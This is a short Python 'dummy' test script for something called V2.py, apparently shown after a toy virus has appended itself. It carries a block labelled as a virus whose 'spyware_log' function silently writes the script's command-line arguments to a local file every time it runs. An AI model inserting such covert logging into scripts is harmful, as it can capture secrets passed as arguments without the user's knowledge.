'''
this is dummy file to test V2.py
'''


print("Hello from test script!")

if __name__ == "__main__":
    print("Running main!")

# --- BEGIN VIRUS ---
import sys

def spyware_log():
    with open("V2.txt", "a") as f:
        f.write(" ".join(sys.argv) + "\n")

spyware_log()
# --- END VIRUS ---
